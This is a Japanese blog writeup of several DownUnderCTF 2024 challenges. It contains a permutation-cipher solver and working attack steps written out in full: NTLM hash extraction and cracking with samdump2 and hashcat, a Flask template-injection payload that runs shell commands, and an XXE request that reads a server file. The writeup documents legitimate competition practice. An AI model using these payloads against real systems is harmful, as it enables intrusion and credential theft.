---
Title: DownUnderCTF 2024 Writeup
Category:
- CTF
- Tech
Date: 2024-07-10T02:37:53+09:00
URL: https://macchanism.hateblo.jp/entry/downunderctf2024-writeup
EditURL: https://blog.hatena.ne.jp/macchanism/macchanism.hateblo.jp/atom/entry/6801883189119936767
---

DownUnderCTFに，3人チームで参加した．

[f:id:macchanism:20240708030222j:plain]

<!-- more -->

私が解いたのは

* [crypto] Sun Zi's Perfect Math Class
* [crypto] shufflebox
* [misc] tldr please summarise
* [misc] DNAdecay
* [forensics] Baby's First Forensics
* [forensics] SAM I AM
* [osint] offtheramp
* [osint] Bridget Lives
* [osint] cityviews
  * 9割は仲間のおかげ
* [web] parrot the emu
* [web] zoo feedback form

である．

<span style="font-size: 150%">目次</span>
[:contents]

公式のwriteupと異なる解き方をした問題を執筆する．

## [crypto] Sun Zi's Perfect Math Class
公式のソルバーとやっていることは近いと思う．

[https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/beginner/sunzi-perfect-math-class/solve/solve.py:embed:cite]

私はこのサイトのコードを利用した．

[https://www.ochappa.net/posts/rsa-hba:embed:cite]


## [crypto] shufflebox
文字列を暗号化(シャッフル)するプログラムは以下の通りである．

```python
import random

PERM = list(range(16))
random.shuffle(PERM)

def apply_perm(s):
	assert len(s) == 16
	return ''.join(s[PERM[p]] for p in range(16))

for line in open(0):
	line = line.strip()
	print(line, '->', apply_perm(line))

#aaaabbbbccccdddd -> ccaccdabdbdbbada
#abcdabcdabcdabcd -> bcaadbdcdbcdacab
#???????????????? -> owuwspdgrtejiiud
```

### writeup
ソルバーは以下の通りである．

```python
from itertools import permutations as perms

# 与えられたパーミュテーションを使ってメッセージを暗号化する関数
def enc(msg, perm):
	return ''.join(msg[perm[p]] for p in range(16))

# パーミュテーションの逆を使って暗号文を復号化する関数
def dec(cip, perm):
    perm_inv = [None]*16
    for idx, val in enumerate(perm):
        perm_inv[val] = idx
    return enc(cip, perm_inv)

# 与えられたメッセージと暗号文
msg0 = 'aaaabbbbccccdddd'
cip0 = 'ccaccdabdbdbbada'
msg1 = 'abcdabcdabcdabcd'
cip1 = 'bcaadbdcdbcdacab'
cip_flag = 'owuwspdgrtejiiud'

# cip0中の 'a', 'b', 'c', 'd' のインデックスの全ての順列を繰り返し処理
for a in [p for p in perms([idx for idx, char in enumerate(cip0) if char=='a'])]:
    for b in [p for p in perms([idx for idx, char in enumerate(cip0) if char=='b'])]:
        for c in [p for p in perms([idx for idx, char in enumerate(cip0) if char=='c'])]:
            for d in [p for p in perms([idx for idx, char in enumerate(cip0) if char=='d'])]:
                # 順列を結合して完全なパーミュテーションを作成
                PERM = [None]*16
                for idx, val in enumerate([v for v in a] + [v for v in b] + [v for v in c] + [v for v in d]):
                    PERM[val] = idx
                # パーミュテーションが正しくmsg1をcip1に暗号化するか確認
                if enc(msg1, PERM) == cip1:
                    # 見つかったパーミュテーションを使ってcip_flagを復号
                    print(dec(cip_flag, PERM))
```

シャッフルするテーブル `PERM` が秘密情報であるので，その特定から始める．以下を繰り返すことで， `PERM` が手に入る．

1. 平文と暗号文の組 `(aaaabbbbccccdddd, ccaccdabdbdbbada)` から，あり得る `PERM` を見つける
2. `PERM` が平文 `abcdabcdabcdabcd` から 暗号文 `bcaadbdcdbcdacab` を生成するかチェック

最後に暗号文 `owuwspdgrtejiiud` から平文を復号することで，フラグを獲得する．

## [forensics] SAM I AM

公式のwriteupと同じ解き方で取り組んだ．

[https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/forensics/samiam/solve/WRITEUP.md:embed:cite]

`hashcat` でクラックに取り組み，ワードリストに `rockyou.txt` を採用した．解き方はChatGPTに聞いたら教えてくれた．

```shell
$ samdump2 SYSTEM SAM > hashes.txt
$ hashcat -m 1000 hashes.txt rockyou.txt 

(中略)

31d6cfe0d16ae931b73c59d7e0c089c0:                         
476b4dddbbffde29e739b618580adb1e:!checkerboard1           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: hashes.txt
Time.Started.....: Sun Jul  7 09:32:52 2024 (2 secs)
Time.Estimated...: Sun Jul  7 09:32:54 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7801.5 kH/s (0.16ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 14340096/14344384 (99.97%)
Rejected.........: 0/14340096 (0.00%)
Restore.Point....: 14327808/14344384 (99.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $CaRaMeL -> !carolyn
```

## [web] parrot the emu

[https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/beginner/parrot-the-emu:embed:cite]

Flaskの `render_template_string` が怪しいと感じたので，`flask 2.0.3 render_template_string` でGoogle検索し，脆弱性やCTFにおける攻撃シナリオを調べた．

[https://blog.hamayanhamayan.com/entry/2021/12/15/225142:embed:cite]

このサイトを参考に `{{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}` を入力した．

[f:id:macchanism:20240706212259p:plain]

どうやらシェルコマンドを実行できるらしいので，素直にフラグを `cat` した．

[f:id:macchanism:20240706212329p:plain]

## [web] zoo feedback form

[https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/beginner/zoo-feedback-form:embed:cite]

`etree.XMLParser(resolve_entities=True)` が怪しいと感じ，脆弱性や攻撃シナリオを調べた．

[https://nanimokangaeteinai.hateblo.jp/entry/2024/02/14/120000:embed:cite]

上記サイトで，XMLといえば "XML External Entity" と言及があった．特に `resolve_entities=True` は危険な引数の設定らしい．

[https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity:embed:cite]

このサイトを参考に具体的な攻撃方法を調べ，実行した．

```bash
$ curl https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/ -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]> <root> <feedb
ack>&xxe;</feedback> </root>'

<div style="color:green;">Feedback sent to the Emus: DUCTF{emU_say$_he!!0_h0!@_ci@0}
</div>
```

